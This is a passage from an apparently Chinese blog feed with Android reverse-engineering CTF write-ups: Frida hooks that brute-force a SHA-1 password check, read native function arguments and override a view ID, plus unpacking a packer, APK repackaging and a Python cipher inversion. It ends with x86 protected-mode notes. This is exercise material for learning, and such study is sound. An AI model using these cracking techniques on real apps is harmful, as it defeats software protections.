        <content type="html"><![CDATA[<h3 id="1-通过hook脚本暴力破解"><a href="#1-通过hook脚本暴力破解" class="headerlink" title="1. 通过hook脚本暴力破解"></a>1. 通过hook脚本暴力破解</h3><h4 id="进入入口点之后，简单查看一下代码的逻辑"><a href="#进入入口点之后，简单查看一下代码的逻辑" class="headerlink" title="进入入口点之后，简单查看一下代码的逻辑"></a>进入入口点之后，简单查看一下代码的逻辑</h4><img src="/2023/07/09/CTF002/image-20230709145110009.png" class="" title="image-20230709145110009"><p>可以发现密码是一个六位数字，经过encode函数加密后跟预定的值进行比较，比较相等就通过。<br>查看这个encode函数使用了sha1摘要算法，这样我们并不能根据hook某一个点位直接获取到正确的密钥，<br>因为密码是六位数字存在暴力破解的可能，我们可以直接hook这个<strong>encode</strong>函数来做一个暴力破解。<br>因为这个_<strong>public class MainActivity extends Activity</strong><em>类不是一个静态类，所以不能直接通过类去调用里面的函数，所以不能直接用</em><strong>Java.use()</strong>_的方式写脚本,需要使用**<em>choose()</em><strong>方法去内存中查找到类</strong>MainActivity**的实例之后再使用类方法</p><pre><code class="js">// 使用 setImmediate 在下一个事件循环中执行代码,防止脚本执行过程中报错Failed to load script: timeout was reachedsetImmediate(function(){  // 在 Java 环境中执行代码  Java.perform(function(){    // 寻找指定类的实例    Java.choose("com.android.ctf.MainActivity",{      // 当匹配到实例时的回调函数      "onMatch":function(instance){        console.log("找到实例");        var str = Java.use("java.lang.String");        var Integer = Java.use("java.lang.Integer")        var start = 100000; // 起始值        var end = 1000000; // 结束值        for (var i = start; i &lt; end; i++) {          // 将整数转换为字符串          var result = instance.encode(Integer.toString(i));          if (result === "6574f28f75dddc488f3c7c21fddfa0cd16901206") {            console.log("找到密码: " + i);            return; // 找到密码后立即返回          }        }      },      // 堆搜索完成时的回调函数      "onComplete":function(){        console.log("堆搜索完成");      }    });  });});</code></pre><p>执行脚本：这个脚本执行起来比较耗费时间，如果手机性能不够可能程序可能会崩溃，需要缩小搜索范围</p><img src="/2023/07/09/CTF002/image-20230709145154071.png" class="" title="image-20230709145154071"><h3 id="2-正向破解"><a href="#2-正向破解" class="headerlink" title="2. 正向破解"></a>2. 正向破解</h3><p>因为这里有完整的算法，所以可以直接把算法扣出来写代码计算一下结果：</p><img src="/2023/07/09/CTF002/image-20230709145403892.png" class="" title="image-20230709145403892"><p>直接扣出来用Eclipse写java代码正向破解效率会更高，也不用担心程序崩溃的问题</p><pre><code class="java">package TestFlag002;import java.security.MessageDigest;import java.security.NoSuchAlgorithmException;public class TestFlag002 {    public static void main(String[] args) {        // TODO Auto-generated method stub        for (int i = 100000; i &lt; 1000000; i++) {            if ("6574f28f75dddc488f3c7c21fddfa0cd16901206".equals(encode(Integer.toString(i)))) {                System.out.println(i);            }        }    }    public static String encode(String decript) {        try {            MessageDigest digest = MessageDigest.getInstance("SHA-1");            digest.update(decript.getBytes());            byte[] messageDigest = digest.digest();            StringBuilder hexString = new StringBuilder();            for (byte b : messageDigest) {                String shaHex = Integer.toHexString(b &amp; 255);                if (shaHex.length() &lt; 2) {                    hexString.append(0);                }                hexString.append(shaHex);            }            return hexString.toString();        } catch (NoSuchAlgorithmException e) {            e.printStackTrace();            return "";        }    }}</code></pre><img src="/2023/07/09/CTF002/image-20230709145448067.png" class="" title="image-20230709145448067"><p><strong>运行一秒钟就可以出结果，效率更高。</strong></p>]]></content>
      
      
      <categories>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android CTF </tag>
            
            <tag> 暴力解密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF003</title>
      <link href="/2023/07/09/CTF003/"/>
      <url>/2023/07/09/CTF003/</url>
      
        <content type="html"><![CDATA[<img src="/2023/07/09/CTF003/image-20230709144529782.png" class="" title="image-20230709144529782"><h3 id="分析函数逻辑"><a href="#分析函数逻辑" class="headerlink" title="分析函数逻辑"></a>分析函数逻辑</h3><p>打开入口函数后，可以发现把校验函数写在so库里了</p><img src="/2023/07/09/CTF003/image-20230709144547072.png" class="" title="image-20230709144547072"><h3 id="IDA分析so库文件"><a href="#IDA分析so库文件" class="headerlink" title="IDA分析so库文件"></a>IDA分析so库文件</h3><p>那接下来用ida打开_native-lib.so_进行分析，文件打开之后可以直接搜索到这个函数，可以看到如果没有动态加载的话，java层映射到native层的本地函数命名特点<strong>Java+包名+函数名</strong></p><img src="/2023/07/09/CTF003/image-20230709144600683.png" class="" title="image-20230709144600683"><h4 id="修复参数"><a href="#修复参数" class="headerlink" title="修复参数"></a>修复参数</h4><p>这个函数解析的看起来比较乱，我们可以修复一下参数类型看会不会好点</p><ul><li>在jadx里面看到只传递了一个参数，这里可以看到又三个参数，实际只有第三个参数_a3_才是我们传递的字符串参数，_a1_是JNIEnv* ，_a2_是JavaObject（表示Java层调用该JNI函数的对象的引用（即Java对象的指针））</li></ul><h4 id="修复完成之后我们来看一下这个函数"><a href="#修复完成之后我们来看一下这个函数" class="headerlink" title="修复完成之后我们来看一下这个函数"></a>修复完成之后我们来看一下这个函数</h4><img src="/2023/07/09/CTF003/image-20230709144614920.png" class="" title="image-20230709144614920"><p>根据图中可知返回值来自于<strong>strcmp</strong>的比较结果，只有返回值为true也就是两个参数相等的情况下，验证才能通过。_strcmp_的两个参数都来自于_convertUnCharToStr_方法。这样的话可以尝试一下看能不能用_frida-trace_跟踪一下调用函数来查看这两个参数的值分别是什么</p><h3 id="使用frida-trace来hook函数的传参"><a href="#使用frida-trace来hook函数的传参" class="headerlink" title="使用frida-trace来hook函数的传参"></a>使用frida-trace来hook函数的传参</h3><img src="/2023/07/09/CTF003/image-20230709144627303.png" class="" title="image-20230709144627303"><p>这里我们可以看到成功的跟踪到了这两个函数，但是_<strong>strcmp()</strong>_触发的有点多，可能代码里面有很多比较的地方，<br>_<strong>convertUnCharToStr()</strong>_触发较少方便我们查看参数。<br>来查看一下跟踪到的函数：发现这里没有识别出来函数的参数可能是因为识别不准确造成的</p><img src="/2023/07/09/CTF003/image-20230709144651083.png" class="" title="image-20230709144651083"><h4 id="根据函数原型编写hook脚本"><a href="#根据函数原型编写hook脚本" class="headerlink" title="根据函数原型编写hook脚本"></a>根据函数原型编写hook脚本</h4><pre><code class="c">void convertUnCharToStr(char* str, unsigned char* UnChar, int ucLen)</code></pre><p>根据函数原型修改一下代码读取一下参数的值：获取so库函数的参数需要从内存中读取</p><img src="/2023/07/09/CTF003/image-20230709144715947.png" class="" title="image-20230709144715947"><p>修改完成之后保存，再点击验证按钮执行的时候看脚本打印结果</p><img src="/2023/07/09/CTF003/image-20230709144751559.png" class="" title="image-20230709144751559"><p>可以看到一串能读懂的字符串我们来试一下这个是不是就是flag</p><img src="/2023/07/09/CTF003/image-20230709144803178.png" class="" title="image-20230709144803178"><p>输入之后点击验证按钮我们就能看到这个信封解封了<br><strong>over~</strong></p>]]></content>
      
      
      <categories>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> frida-hook </tag>
            
            <tag> Android CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF004</title>
      <link href="/2023/07/09/CTF004/"/>
      <url>/2023/07/09/CTF004/</url>
      
        <content type="html"><![CDATA[<h3 id="1-脱壳"><a href="#1-脱壳" class="headerlink" title="1. 脱壳"></a>1. 脱壳</h3><p>用jadx打开之后发现有加壳那先脱壳再分析</p><img src="/2023/07/09/CTF004/image-20230709013442386.png" class="" title="image-20230709013442386"><p>看名字是一个_qihoo_的壳，这个呢我们使用反射大师去脱壳，反射大师需要运行在安卓7.1以下的系统上<br>在root过的手机上安装一个_VMOS Pro_模拟一个安卓7.1的系统<br>安装上反射大师和CTF004,注意：反射大师需要重启才能启用<br>然后打开反射大师，选择我们的CTF004并打开</p><img src="/2023/07/09/CTF004/image-20230709013731077.png" class="" title="image-20230709013731077"><p>然后点击这个芒星点击 当前ACTIVITY</p><img src="/2023/07/09/CTF004/image-20230709013744990.png" class="" title="image-20230709013744990"><p>然后点击写出DEX-&gt;修复Magic-&gt;确定<br>之后去提示的路径处将文件拷贝到物理机，再使用_adb pull_命令拉取下来对脱壳后的文件开始分析。</p><img src="/2023/07/09/CTF004/image-20230709013759330.png" class="" title="image-20230709013759330"><h3 id="2-开始分析"><a href="#2-开始分析" class="headerlink" title="2. 开始分析"></a>2. 开始分析</h3><h4 id="分析代码逻辑"><a href="#分析代码逻辑" class="headerlink" title="分析代码逻辑"></a>分析代码逻辑</h4><img src="/2023/07/09/CTF004/image-20230709013828469.png" class="" title="image-20230709013828469"><p>进来_MainActivity_之后发现_onCreate_函数都在native层去实现了，那再看看其它的类<br>点进Flag类</p><img src="/2023/07/09/CTF004/image-20230709013838746.png" class="" title="image-20230709013838746"><p>进来之后发现这里面有些需要我们注意的点：</p><pre><code>  1. 有两个key  2. 有计算这两个key的地方，且在MyService类中进行了对比如果符合条件会去调用calcFlagFirstStep()</code></pre><img src="/2023/07/09/CTF004/image-20230709013850294.png" class="" title="image-20230709013850294"><ol start="3"><li>调用之后会去执行comm()方法对接收到的字符串进行一系列操作</li></ol><h4 id="hook获取Flag"><a href="#hook获取Flag" class="headerlink" title="hook获取Flag"></a>hook获取Flag</h4><p>接下来我们写脚本来hook以下这两个计算函数看返回值是什么就可以直接拿到Flag了</p><pre><code class="js">setImmediate(function(){    Java.perform(function(){        // 因为这个hook不需要实例化所以直接使用Java.use就可以        var Flag = Java.use("ctf.crack.vulcrack.Flag")        var ret1 = Flag.calcFlagFirstStep();        console.log("ret1= "+ret1);        var ret2 = Flag.calcFlagSecondStep();        console.log("ret2= "+ret2);    })})</code></pre><p> 执行hook脚本</p><img src="/2023/07/09/CTF004/image-20230709014023478.png" class="" title="image-20230709014023478"><p><strong>这里可以看到两个返回值加起来就是完整的Flag。</strong></p><p><strong>over~</strong></p>]]></content>
      
      
      <categories>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> frida-hook </tag>
            
            <tag> Android CTF </tag>
            
            <tag> Android脱壳 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF005</title>
      <link href="/2023/07/08/CTF005/"/>
      <url>/2023/07/08/CTF005/</url>
      
        <content type="html"><![CDATA[<img src="/2023/07/08/CTF005/image-20230708205138665.png" class="" title="image-20230708205138665"><p><strong>PS：这个题目比较简单，尝试采用多种不同的方式去获取flag</strong></p><h3 id="第一种方式：静态分析"><a href="#第一种方式：静态分析" class="headerlink" title="第一种方式：静态分析"></a>第一种方式：静态分析</h3><p>用jadx打开进入口点看代码逻辑</p><img src="/2023/07/08/CTF005/image-20230708205241183.png" class="" title="image-20230708205241183"><p> 看入口点的代码非常简单明了进入case vip分支就算是通过了验证，那我们跟进去看一下它里面有没有校验的函数</p><img src="/2023/07/08/CTF005/image-20230709010401719.png" class="" title="image-20230709010401719"><p>进来之后发现它只是用_setContenView_方法加载了一个新的布局，那去看一眼这个布局的xml文件<br>资源文件在res-&gt;layout文件夹里面：进来之后发现flag是一个明文存储的字符串</p><img src="/2023/07/08/CTF005/image-20230709010417770.png" class="" title="image-20230709010417770"><p>这个比较简单，再使用改跳转重打包的方式获取flag试一下</p><h3 id="第二种方式：重打包"><a href="#第二种方式：重打包" class="headerlink" title="第二种方式：重打包"></a>第二种方式：重打包</h3><p>使用_AndroidKiller_重打包改一下apk的执行流程：先来分析一下代码看修改哪里才能让我们获取到flag</p><img src="/2023/07/08/CTF005/image-20230709010525101.png" class="" title="image-20230709010525101"><ol><li>首先我们点击首页的“点我获取FLAG”按钮之后会进入第一个case，之后会校验<strong>a</strong>的值大于30才能跳转往else分支充钱，<strong>这里可以把跳转改为(a &gt; 30)</strong></li><li>之后我们再看一下”<strong>充钱”<strong>之后创建的新对象</strong>b</strong>做了什么</li></ol><img src="/2023/07/08/CTF005/image-20230709010543229.png" class="" title="image-20230709010543229"><p>创建共享对象并将其中<strong>points</strong>的值减去了<strong>30</strong>，来手动查看一下共享对象文件中的内容</p><img src="/2023/07/08/CTF005/image-20230709010633625.png" class="" title="image-20230709010633625"><img src="/2023/07/08/CTF005/image-20230709010639454.png" class="" title="image-20230709010639454"><p>当我们点击”充钱“按钮之后，<strong>b</strong>类会设置‘<em>TextView</em>’的文本，设置‘<em>points</em>’的值，弹出一个提示吐司</p><ol><li>重新打开应用之后’<em>TextView</em>’的文本就改变了</li></ol><img src="/2023/07/08/CTF005/image-20230709010728913.png" class="" title="image-20230709010728913"><img src="/2023/07/08/CTF005/image-20230709010813560.png" class="" title="image-20230709010813560"><ul><li>重新设置布局、设置按钮监听事件，根据积分设置相关试图的状态</li></ul><ol start="2"><li>这样看来我们只需要改变前面的if判断条件**(a &gt; 30)**就可以了</li></ol><p>​用AndroidKiller打开apk，搜索里面的字符串定位if分支</p><img src="/2023/07/08/CTF005/image-20230709010946212.png" class="" title="image-20230709010946212"><p>定位到之后修改里面的if判断条件</p><img src="/2023/07/08/CTF005/image-20230709010957788.png" class="" title="image-20230709010957788"><p> 修改完成之后重新编译打包即可</p><img src="/2023/07/08/CTF005/image-20230709011045124.png" class="" title="image-20230709011045124"><img src="/2023/07/08/CTF005/CTF005.gif" class="" title="CTF005"><h3 id="第三种方式：frida-hook"><a href="#第三种方式：frida-hook" class="headerlink" title="第三种方式：frida-hook"></a>第三种方式：frida-hook</h3><p>对这道题目写hook脚本的话，可以去hook它if判断时候用到的view.getId()方法</p><pre><code class="javascript">setImmediate(function(){  Java.perform(function(){    var View = Java.use("android.view.View");    View.getId.implementation = function(){      var ret = this.getId();      ret = 2131296337;   // 修改getId()的返回值为vip的值      return ret;    }          })})</code></pre><p>注入脚本</p><img src="/2023/07/08/CTF005/image-20230709011305718.png" class="" title="image-20230709011305718"><img src="/2023/07/08/CTF005/CTF005_hook.gif" class="" title="CTF005_hook"><p><strong>over~</strong></p>]]></content>
      
      
      <categories>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 重打包 </tag>
            
            <tag> frida-hook </tag>
            
            <tag> Android CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF006</title>
      <link href="/2023/07/07/CTF006/"/>
      <url>/2023/07/07/CTF006/</url>
      
        <content type="html"><![CDATA[<img src="/2023/07/07/CTF006/image-20230708111943817.png" class="" title="image-20230708111943817"><h3 id="1-用jadx查看入口点"><a href="#1-用jadx查看入口点" class="headerlink" title="1. 用jadx查看入口点"></a>1. 用jadx查看入口点</h3><p>在<em>AndroidManifest.xml</em>里面找到入口函数</p><span id="more"></span><img src="/2023/07/07/CTF006/image-20230708112024572.png" class="" title="image-20230708112024572"><h4 id="1-1-看这段代码我们需要关注两个方法："><a href="#1-1-看这段代码我们需要关注两个方法：" class="headerlink" title="1.1. 看这段代码我们需要关注两个方法："></a>1.1. 看这段代码我们需要关注两个方法：</h4><pre><code>  1. getSecret()是一个native层的函数，这个函数对编辑框的内容进行了一定的处理之后返回了ans  2. check()方法校验，通过校验才能得到正确的Flag</code></pre><p>先分析下chek()是怎么实现的，等下再去看native层。</p><h3 id="2-查看check-方法"><a href="#2-查看check-方法" class="headerlink" title="2. 查看check()方法"></a>2. 查看check()方法</h3><img src="/2023/07/07/CTF006/image-20230708123143622.png" class="" title="image-20230708123143622"><p>这段代码的主要作用是从数据库中取出<strong>secret</strong>值（用hello的MD5值作为name对应的secret值）与我们输入的值（经过getSecret()方法处理）进行比较相等就返回true。</p><img src="/2023/07/07/CTF006/image-20230708123203528.png" class="" title="image-20230708123203528"><p>分析完check()方法之后，现在我们可知：</p><ul><li>输入编辑框的值经过getSecret()的运算之后 = ‘kEvKc|roAkNADgGExUeq’就可以通过校验</li></ul><p>那接下来我们去分析一下getSecret()这个方法。</p><h3 id="3-分析getSecret"><a href="#3-分析getSecret" class="headerlink" title="3. 分析getSecret()"></a>3. 分析getSecret()</h3><h4 id="3-1-用ida打开so文件之后，通过命名惯例用java定位到函数位置，再按F5修改以下参数类型方便分析"><a href="#3-1-用ida打开so文件之后，通过命名惯例用java定位到函数位置，再按F5修改以下参数类型方便分析" class="headerlink" title="3.1. 用ida打开so文件之后，通过命名惯例用java定位到函数位置，再按F5修改以下参数类型方便分析"></a>3.1. 用ida打开so文件之后，通过命名惯例用java定位到函数位置，再按F5修改以下参数类型方便分析</h4><img src="/2023/07/07/CTF006/image-20230708123314917.png" class="" title="image-20230708123314917"><h4 id="3-2-先初步分析这段代码来猜测里面的逻辑（因为不知道参数的内容，所以猜测不一定正确）我们依旧可以知道几点"><a href="#3-2-先初步分析这段代码来猜测里面的逻辑（因为不知道参数的内容，所以猜测不一定正确）我们依旧可以知道几点" class="headerlink" title="3.2. 先初步分析这段代码来猜测里面的逻辑（因为不知道参数的内容，所以猜测不一定正确）我们依旧可以知道几点"></a>3.2. 先初步分析这段代码来猜测里面的逻辑（因为不知道参数的内容，所以猜测不一定正确）我们依旧可以知道几点</h4><pre><code>  1. 代码通过接收我们输入的字符串，将其和内置的base_string进行一些运算得到一个新的字符串，最后将新的字符串返回  2. 因为最后返回的新字符串是动态生成的，所以我们无法通过简单的hook去获取到正确的flag  3. 这样子的话我们只能尝试一下看，能不能通过分析它的算法和入参写出它的反解算法  4. 我们要详细分析算法写反解脚本的话，需要通过动态调试的方法来确定它的入参和返回值，另外静态反编译出来的伪代码可能也不准确不能支持我们去精确的写出反解算法</code></pre><h3 id="4-用ida动态附加调试：attach过程略过"><a href="#4-用ida动态附加调试：attach过程略过" class="headerlink" title="4. 用ida动态附加调试：attach过程略过"></a>4. 用ida动态附加调试：attach过程略过</h3><h4 id="4-1-attach程序之后，找到我们的getSecret-方法下断点段下来"><a href="#4-1-attach程序之后，找到我们的getSecret-方法下断点段下来" class="headerlink" title="4.1. attach程序之后，找到我们的getSecret()方法下断点段下来"></a>4.1. attach程序之后，找到我们的getSecret()方法下断点段下来</h4><img src="/2023/07/07/CTF006/image-20230708123611283.png" class="" title="image-20230708123611283"><img src="/2023/07/07/CTF006/image-20230708123621214.png" class="" title="image-20230708123621214"><p>在函数开始的地方下断点，在手机上点击_<strong>TRY IT!</strong>_按钮之后我们可以中断在这里，这时候我们可以看到它的<strong>base_string</strong>字符串<br>_F8_继续往下跟，到获取dest[]的地方</p><img src="/2023/07/07/CTF006/image-20230708123650927.png" class="" title="image-20230708123650927"><img src="/2023/07/07/CTF006/image-20230708123700143.png" class="" title="image-20230708123700143"><p>分析后可以发现数组的内容是从0~0x44的dw数组。</p><h4 id="4-2-接下来开始分析for循环"><a href="#4-2-接下来开始分析for循环" class="headerlink" title="4.2. 接下来开始分析for循环"></a>4.2. 接下来开始分析for循环</h4><p><strong>第一个for循环</strong></p><img src="/2023/07/07/CTF006/image-20230708123740861.png" class="" title="image-20230708123740861"><ul><li><p>循环的次数根据组的长度获得</p></li><li><p>循环取出dest[i]中的值 + <strong>0x10</strong>，然后再写回去</p><p><strong>第二个嵌套for循环</strong></p></li></ul><img src="/2023/07/07/CTF006/image-20230708123755894.png" class="" title="image-20230708123755894"><ul><li>外层循环的次数是我们输入的字符串的长度</li><li>内存循环的次数是base_string字符串的长度</li><li>这个嵌套循环是将我们输入的字符逐个和base_string中的字符对比，相等的话就跳出本轮内层循环</li></ul><img src="/2023/07/07/CTF006/image-20230708123825332.png" class="" title="image-20230708123825332"><p>用循环次数去dest[]中取出对应的值-&gt;再用这个取出的值去base_string中取出对应下标的字符-&gt;然后用这个字符替换掉我们输入的inputStr[外层循环]的字符</p><p><strong>最后一个循环</strong></p><img src="/2023/07/07/CTF006/image-20230708123945089.png" class="" title="image-20230708123945089"><ul><li>最后一个循环时将我们前面循环生成的新字符串再次循环进行<strong>^</strong>操作，然后放回原位、</li></ul><h3 id="5-然后这个加密我们就全部分析完成了，修改一下我们前面猜错的伪代码注释"><a href="#5-然后这个加密我们就全部分析完成了，修改一下我们前面猜错的伪代码注释" class="headerlink" title="5. 然后这个加密我们就全部分析完成了，修改一下我们前面猜错的伪代码注释"></a>5. 然后这个加密我们就全部分析完成了，修改一下我们前面猜错的伪代码注释</h3><img src="/2023/07/07/CTF006/image-20230708124023310.png" class="" title="image-20230708124023310"><h3 id="算法分析完成"><a href="#算法分析完成" class="headerlink" title="算法分析完成"></a>算法分析完成</h3><p>接下来我们就可以写这个算法的反解脚本了，写反解脚本可以从最后一个循环往前推过去</p><p><strong>结果字符串循环对字符进行与运算，然后再取模128确保结果不大于ASCII码的最大值-&gt;然后将计算完成的字符逐个在base_string里面找到字符对应的索引值(即dest[k]的值)-&gt;如果这个索引值小于16(dest[]中的最小值0x10)表示它对应的索引值在base_string的前16位-&gt;就把下标值加上base_string的长度-&gt;最后打印字符的时候还要把索引值([dest[i]])减去0x10</strong></p><pre><code class="python">static_str = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!{|}~'now = 'kEvKc|roAkNADgGExUeq'for i, each in enumerate(now):    tmp = chr((ord(each)^i)%128)    index = static_str.find(tmp)    if index &lt; 16:        index = index + len(static_str) # 如果index &lt; 16，给index加上字符集长度实现循环查找    print(static_str[index-16], end='')</code></pre><img src="/2023/07/07/CTF006/image-20230708124148899.png" class="" title="image-20230708124148899"><p><strong>over~</strong></p>]]></content>
      
      
      <categories>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 加密解密 </tag>
            
            <tag> Android CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>32. 平坦模型</title>
      <link href="/2022/12/11/32-%E5%B9%B3%E5%9D%A6%E6%A8%A1%E5%9E%8B/"/>
      <url>/2022/12/11/32-%E5%B9%B3%E5%9D%A6%E6%A8%A1%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="01-为什么要引入平坦模型及平坦模型的特点"><a href="#01-为什么要引入平坦模型及平坦模型的特点" class="headerlink" title="01. 为什么要引入平坦模型及平坦模型的特点"></a>01. 为什么要引入平坦模型及平坦模型的特点</h2><p>传统的分段模型：未开启分页机制</p><span id="more"></span><img src="/2022/12/11/32-%E5%B9%B3%E5%9D%A6%E6%A8%A1%E5%9E%8B/e4045b4ddc88eebf910e6169ed2ecf2c.png" class=""><p>传统的分段模型：开启分页机制</p><img src="/2022/12/11/32-%E5%B9%B3%E5%9D%A6%E6%A8%A1%E5%9E%8B/8bef1c3680c9bc4faaf1c6d979fd2232.png" class=""><p>不分段的管理模型，平坦模型（Flat Model）</p><img src="/2022/12/11/32-%E5%B9%B3%E5%9D%A6%E6%A8%A1%E5%9E%8B/c0fd4ef83504728378d25175bacdc8ed.png" class=""><p>就是将全部的4G字节内存整体上作为一个大段来处理。每个段都指向4G字节的段，段基地址都是<strong>0</strong>、段界限都是<strong>0xFFFFF</strong>、段的粒度是<strong>4K字节</strong>。</p><h2 id="02-在主引导程序中创建平坦模型下的段"><a href="#02-在主引导程序中创建平坦模型下的段" class="headerlink" title="02. 在主引导程序中创建平坦模型下的段"></a>02. 在主引导程序中创建平坦模型下的段</h2><p>本章程序：<br>引导程序：<strong>c32_mbe.asm</strong>，具体看代码注释。<br>内核程序：<strong>c32_core.asm</strong><br>用户程序0：<strong>c32_app0.asm</strong><br>用户程序1：<strong>c32_app1.asm</strong></p><h2 id="03-平坦模型对内核程序分段的影响"><a href="#03-平坦模型对内核程序分段的影响" class="headerlink" title="03. 平坦模型对内核程序分段的影响"></a>03. 平坦模型对内核程序分段的影响</h2><p>内核程序中需要将段的定义注释掉，此后对内核代码的访问要通过指向4G字节的段。这样做是让内核程序中的标号统一编制，即具有连续的汇编地址。</p><img src="/2022/12/11/32-%E5%B9%B3%E5%9D%A6%E6%A8%A1%E5%9E%8B/71b6659ee05966635ef054d3bb2af257.png" class=""><p>内核加载到<strong>0x00040000</strong>地址处、将内核重定位到内存高端之后，地址变为<strong>0x80040000</strong>。程序中可以使用<strong>org 0x80040000</strong>指令来指定内核起始汇编地址。</p><img src="/2022/12/11/32-%E5%B9%B3%E5%9D%A6%E6%A8%A1%E5%9E%8B/e4479fe263c946b053548fbea5eccd61.png" class=""><p>也可以使用<strong>vfollows</strong>字句，来指定当前段的汇编地址延续上一个段的汇编地址。</p><p>使用平坦模型之后，在程序一开始时指定<strong>DS、CS</strong>为4G字节段之后，就不需要对段进行切换了，在程序中也就没有加载段寄存器<mark>mov ds/es</mark>的指令。</p><h2 id="04-平坦模型对加载内核程序的影响"><a href="#04-平坦模型对加载内核程序的影响" class="headerlink" title="04. 平坦模型对加载内核程序的影响"></a>04. 平坦模型对加载内核程序的影响</h2><p>内核程序中内核头部段的程序入口点就不需要记录其段地址、只需要记录其偏移即可</p><p>平坦模型不是处理器的工作模式，只是用来内存访问的一种手段。只要将整个程序看成是一个段，就可以认为采用了平坦模型。</p><p>具体内容看代码注释。</p><h2 id="05-平坦模型下的内核初始化与内核任务的确立"><a href="#05-平坦模型下的内核初始化与内核任务的确立" class="headerlink" title="05. 平坦模型下的内核初始化与内核任务的确立"></a>05. 平坦模型下的内核初始化与内核任务的确立</h2><p>本章是在开启分页，并将低端1M字节映射到高端之后才开始创建中断描述符表<strong>IDT</strong>的。<strong>IDT</strong>在高端地址为<strong>0x8001F000</strong>。</p><p>平坦模型下的内存布局：</p><img src="/2022/12/11/32-%E5%B9%B3%E5%9D%A6%E6%A8%A1%E5%9E%8B/522d7f0bee6939db5cb7421de6316d33.png" class=""><p>平坦模式下的<strong>TCB</strong>布局：</p><img src="/2022/12/11/32-%E5%B9%B3%E5%9D%A6%E6%A8%A1%E5%9E%8B/2b0c617020c4dd5231887815186c41d7.png" class=""><p>具体看代码注释。</p><h2 id="06-平坦模型下的用户程序结构"><a href="#06-平坦模型下的用户程序结构" class="headerlink" title="06. 平坦模型下的用户程序结构"></a>06. 平坦模型下的用户程序结构</h2><p>接上一节。</p><p>具体看代码注释。</p><h2 id="07-平坦模型下的用户任务创建"><a href="#07-平坦模型下的用户任务创建" class="headerlink" title="07. 平坦模型下的用户任务创建"></a>07. 平坦模型下的用户任务创建</h2><p>接上一节。</p><p>具体看代码注释。</p><h2 id="08-在用户任务内动态分配内存"><a href="#08-在用户任务内动态分配内存" class="headerlink" title="08. 在用户任务内动态分配内存"></a>08. 在用户任务内动态分配内存</h2><p>接上一节。</p><p>具体看代码注释。</p><h2 id="09-平坦模型下的多任务切换演示与调试"><a href="#09-平坦模型下的多任务切换演示与调试" class="headerlink" title="09. 平坦模型下的多任务切换演示与调试"></a>09. 平坦模型下的多任务切换演示与调试</h2><p>程序写入：</p><img src="/2022/12/11/32-%E5%B9%B3%E5%9D%A6%E6%A8%A1%E5%9E%8B/5460f778c4ae726c6f5ac450cd6b7349.png" class=""><p><strong>Virtual Box</strong>虚拟机：</p><img src="/2022/12/11/32-%E5%B9%B3%E5%9D%A6%E6%A8%A1%E5%9E%8B/image-20221113170529058.png" class="" title="image-20221113170529058">]]></content>
      
      
      <categories>
          
          <category> Windows保护模式 </category>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> X86汇编语言：实模式到保护模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>31. 分页和动态页面分配</title>
      <link href="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/"/>
      <url>/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/</url>
      
        <content type="html"><![CDATA[<h2 id="01-保护模式下的段式虚拟内存管理"><a href="#01-保护模式下的段式虚拟内存管理" class="headerlink" title="01. 保护模式下的段式虚拟内存管理"></a>01. 保护模式下的段式虚拟内存管理</h2><span id="more"></span><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/62bfe0734f409c5d5c8112070c36e1c1-16683301558173.png" class=""><p>任务的划分实际上是内存空间的划分</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/036caff772c8fd8009a012aaf154b714-16683301558161.png" class=""><p>内存空间的访问时依靠分段机制进行的，是通过将内存划分为段来进行的。现在描述符表中定义每个段的描述符，然后通过描述符来访问其对应的内存段。</p><p>程序中先将段选择子送入段寄存器<strong>sreg</strong>中，再使用<mark>jmp、call</mark>指令进行跳转。其中段选择子的<strong>TI = 0</strong>表示描述符再GDT中，<strong>TI = 1</strong>表示在LDT中。</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/fe2e91264c510777c1f5ab83f4ed81e3-16683301558172.png" class=""><p>每个任务的描述符索引是13位，最多<strong>2^13 = 8192</strong>个，段内偏移是32位的，段的最大长度是<strong>2^32 = 4GB</strong>，则任务的全局部分为<strong>2^13 * 2^32 = 2^45 = 32TB</strong>，任务的私有部分为<strong>2^13 * 2^32 = 2^45 = 32TB</strong>，则一个任务的理论总大小为<strong>64TB</strong>。在一个多任务系统中，还有其他多个任务。但是32跟地址线最多能寻址4GB的物理内存空间。</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/3a4cfb5324b487b51a585fe54fc56503-16683301558174.png" class=""><p>上图中，任务的全局部分占用物理内存的高2G字节，任务的私有部分占用物理内存的低2G字节</p><img 